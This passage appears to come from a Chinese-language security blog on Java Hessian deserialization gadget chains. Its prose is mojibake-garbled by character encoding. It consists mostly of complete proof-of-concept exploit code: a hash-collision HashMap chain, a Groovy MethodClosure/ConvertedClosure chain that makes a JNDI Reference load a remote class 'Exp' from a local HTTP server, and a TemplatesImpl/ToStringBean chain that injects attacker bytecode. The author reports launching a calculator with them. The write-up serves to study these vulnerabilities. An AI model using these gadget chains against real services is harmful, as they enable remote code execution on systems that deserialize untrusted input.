<span class="variable">ctx</span> <span class="operator">=</span> (Context) ccCons.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());  </span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(ctx,<span class="string">&quot;ocean&quot;</span>,<span class="string">&quot;ocean&quot;</span>); <span class="comment">//_itemsè¦è¿‡forå¾ªç¯  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">unhash</span> <span class="operator">=</span> unhash(qName.hashCode()); <span class="comment">//å°†å“ˆå¸Œå€¼è½¬æ¢å›åŸå§‹æ•°æ®çš„ç®—æ³•,æ”¾å…¥åˆ°Xstringçš„å€¼ä¸­,ä¸ºäº†p.hash == hash  </span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(unhash);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, qName, qName, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, xString, xString, <span class="literal">null</span>));  </span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        String result=Hessian_serialize(hashMap);  </span><br><span class="line">        Hessian_unserialize(result);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span><span class="params">(StringBuilder partial, <span class="type">int</span> target)</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;  </span><br><span class="line">        <span class="keyword">if</span> (div &lt;= <span class="number">65535</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (div != <span class="number">0</span>)  </span><br><span class="line">                partial.append((<span class="type">char</span>)div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            unhash0(partial, div);  </span><br><span class="line">            partial.append((<span class="type">char</span>)rem);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span> <span class="params">( <span class="type">int</span> hash )</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (target == Integer.MIN_VALUE)  </span><br><span class="line">                <span class="keyword">return</span> answer.toString();  </span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;  </span><br><span class="line">        &#125;  </span><br><span class="line">        unhash0(answer, target);  </span><br><span class="line">        <span class="keyword">return</span> answer.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Hessian_serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);  </span><br><span class="line">        SerializerFactory serializerFactory=<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();  </span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);  </span><br><span class="line">        hessianOutput.setSerializerFactory(serializerFactory);  </span><br><span class="line">        hessianOutput.writeObject(object);  </span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Hessian_unserialize</span><span class="params">(String obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">byte</span>[] code=Base64.getDecoder().decode(obj);  </span><br><span class="line">        ByteArrayInputStream byteArrayInputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(code);  </span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);  </span><br><span class="line">        hessianInput.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String field, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        Field dfield=object.getClass().getDeclaredField(field);  </span><br><span class="line">        dfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        dfield.set(object,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104184419709.png" class=""><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°Payloadä¸­å‡ºç°äº†ä¸€ä¸ªHotSwappableTargetSourceæ–¹æ³•è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå…¶å®æ˜¯ä¸ºäº†ç»•è¿‡å‰é¢çš„hashé‚£é‡Œçš„åˆ¤æ–­å…·ä½“æ˜¯å› ä¸ºä»€ä¹ˆå¯ä»¥å‚è€ƒï¼š<br><a href="https://mp.weixin.qq.com/s/dbT8_O3o9BbCKcg-ecGMgg">https://mp.weixin.qq.com/s/dbT8_O3o9BbCKcg-ecGMgg</a><br>æˆ‘è‡ªå·±çš„ç†è§£æ˜¯å› ä¸ºè¿™ä¸ªç±»ä»–å­˜åœ¨equalsæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104191416009.png" class=""><p>å¹¶ä¸”è¿™é‡Œçš„targetæ˜¯å¯æ§çš„</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104191446748.png" class=""><h2 id="Groovyé“¾"><a href="#Groovyé“¾" class="headerlink" title="Groovyé“¾"></a>Groovyé“¾</h2><p>ç¯å¢ƒä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨é“¾åˆ†æ-2"><a href="#è°ƒç”¨é“¾åˆ†æ-2" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h3><p>è¿™æ¡é“¾å­çš„å…³é”®ç‚¹åœ¨MethodClosureè¿™ä¸ªç±»ä¸­çš„docallæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193248159.png" class=""><p>å†æ¥çœ‹çœ‹ä»–çš„æ„é€ æ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193329595.png" class=""><p>å¯ä»¥çœ‹åˆ°æ¥æ”¶ä¸¤ä¸ªå‚æ•°ä¸€ä¸ªobjectä»»æ„å¯¹è±¡ä¸€ä¸ªå­—ç¬¦ä¸²æ–¹æ³•ï¼Œåœ¨ç»“åˆä¸Šé¢çš„doCallæ–¹æ³•è¿™é‡Œå¾ˆå®¹æ˜“èƒ½çœ‹å‡ºæ¥å°±æ˜¯å¯ä»¥è°ƒç”¨ä»»æ„å¯¹è±¡çš„ä»»æ„æ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193522153.png" class=""><p>å¹¶ä¸”å‚æ•°ä¹Ÿæ˜¯å¯æ§çš„ã€‚é‚£è¿™é‡Œå°±å»éœ€è¦æ‰¾ä¸€ä¸‹è°ä¼šè°ƒç”¨doCallæ–¹æ³•å¹¶ä¸”æ˜¯å¯æ§çš„æ‰¾åˆ°Closureç±»çš„callæ–¹æ³•è°ƒç”¨doCallæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193914317.png" class=""><p>è¿™é‡Œæ˜¯é€šè¿‡åå°„è°ƒç”¨çš„ï¼Œå†å»æ‰¾ä¸€ä¸‹è°è°ƒç”¨äº†callæ–¹æ³•ï¼Œæ‰¾åˆ°äº†ConvertedClosureç±»é‡Œé¢çš„invokeCustomæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104194048298.png" class=""><p>å¹¶ä¸”è¿™é‡Œçš„getDelegateæ˜¯å¯æ§çš„å¸ˆå‚…ç›´æ¥çœ‹ConversionHandlerç±»çš„æ„é€ æ–¹æ³•æˆ‘å°±ä¸è´´å›¾äº†ï¼Œé‚£è¿™ä¸ªinvokeCustomæ–¹æ³•åˆæ˜¯åœ¨å“ªé‡Œè¢«è°ƒç”¨çš„å‘¢ï¼Ÿ</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104194501959.png" class=""><p>åœ¨å®ƒçš„çˆ¶ç±»é‡Œçš„invokeæ–¹æ³•ä¸­ä¼šè°ƒç”¨è¿™é‡Œï¼Œæ‰€ä»¥ç°åœ¨éœ€è¦æ‰¾ä¸€ä¸ªåŠ¨æ€ä»£ç†çš„å½¢å¼æ¥è¿›è¡Œè§¦å‘å¹¶ä¸”è°ƒç”¨Resiné“¾çš„ååŠæ®µContinuationDirContextç±»ä¸­çš„getTargetContextæ–¹æ³•å®Œæˆé“¾å­çš„è§¦å‘ã€‚<br>æ‰€ä»¥ç°åœ¨éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è§¦å‘å‰åŠæ®µé“¾çš„å…¥å£ï¼Œè¿™é‡Œåªèƒ½ç”¨TreeMapç±»åŸå› å‚è€ƒ<br><a href="https://mp.weixin.qq.com/s/daciyp4xHqbEy9drMnKizg">https://mp.weixin.qq.com/s/daciyp4xHqbEy9drMnKizg</a><br><a href="https://xz.aliyun.com/t/13345?time__1311=GqmxuiDQ5Cq0HRx+hODcDRxvbSh27bD#toc-7">https://xz.aliyun.com/t/13345?time__1311=GqmxuiDQ5Cq0HRx%2BhODcDRxvbSh27bD#toc-7</a></p><p>è®°å½•ä¸‹Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.*;  </span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.ConvertedClosure;  </span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Groovy</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exp&quot;</span>, <span class="string">&quot;Exp&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();  </span><br><span class="line">    cpe.setResolvedObj(reference);  </span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationDirContext&quot;</span>);  </span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(CannotProceedException.class,Hashtable.class);  </span><br><span class="line">    declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">c1</span> <span class="operator">=</span> declaredConstructor.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());  </span><br><span class="line">  </span><br><span class="line">    <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(c1,<span class="string">&quot;listBindings&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">ConvertedClosure</span> <span class="variable">convertedClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;compareTo&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Proxy.newProxyInstance(convertedClosure.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Comparable.class&#125;, convertedClosure);  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; e = Class.forName(<span class="string">&quot;java.util.TreeMap$Entry&quot;</span>);  </span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor1 = e.getDeclaredConstructor(Object.class, Object.class, e);  </span><br><span class="line">    declaredConstructor1.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> declaredConstructor1.newInstance(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>, <span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor2 = e.getDeclaredConstructor(Object.class, Object.class, e);  </span><br><span class="line">    declaredConstructor2.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> declaredConstructor2.newInstance(o, <span class="number">2</span>, a);  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; t = Class.forName(<span class="string">&quot;java.util.TreeMap&quot;</span>);  </span><br><span class="line">    <span class="type">TreeMap</span> <span class="variable">treeMap</span> <span class="operator">=</span> (TreeMap) t.newInstance();  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;size&quot;</span>);  </span><br><span class="line">    size.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    size.set(treeMap,<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">modCount</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;modCount&quot;</span>);  </span><br><span class="line">    modCount.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    modCount.set(treeMap,<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">root</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;root&quot;</span>);  </span><br><span class="line">    root.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    root.set(treeMap,a);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">right</span> <span class="operator">=</span> e.getDeclaredField(<span class="string">&quot;right&quot;</span>);  </span><br><span class="line">    right.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    right.set(a,o1);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">byte</span>[] serialize = serialize(treeMap);  </span><br><span class="line">    unSerialize(serialize);  </span><br><span class="line">  </span><br><span class="line">   &#125;  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">    <span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);  </span><br><span class="line">    output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);  </span><br><span class="line">    output.writeObject(obj);  </span><br><span class="line">    output.flush();  </span><br><span class="line">    <span class="type">byte</span>[] bytes = baos.toByteArray();  </span><br><span class="line">    <span class="keyword">return</span> bytes;  </span><br><span class="line">   &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unSerialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">    <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);  </span><br><span class="line">    input.readObject();  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104195944414.png" class=""><p>æˆåŠŸå¼¹å‡º</p><h2 id="TemplatesImpl-SignedObjectäºŒæ¬¡ååºåˆ—åŒ–"><a href="#TemplatesImpl-SignedObjectäºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="TemplatesImpl+SignedObjectäºŒæ¬¡ååºåˆ—åŒ–"></a>TemplatesImpl+SignedObjectäºŒæ¬¡ååºåˆ—åŒ–</h2><p>ä½¿ç”¨äºåœ¨ä¸å‡ºç½‘çš„åœºæ™¯ä¸‹ä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_TemplatesImpl_SignedObject</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Hessian_stu/src/main/java/Exp.class&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);  </span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(objectBean,<span class="string">&quot;1&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] payload = Hessian2_Serial(hashMap);  </span><br><span class="line">        Hessian2_Deserial(payload);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);  </span><br><span class="line">        hessian2Output.writeObject(o);  </span><br><span class="line">        hessian2Output.flushBuffer();  </span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span 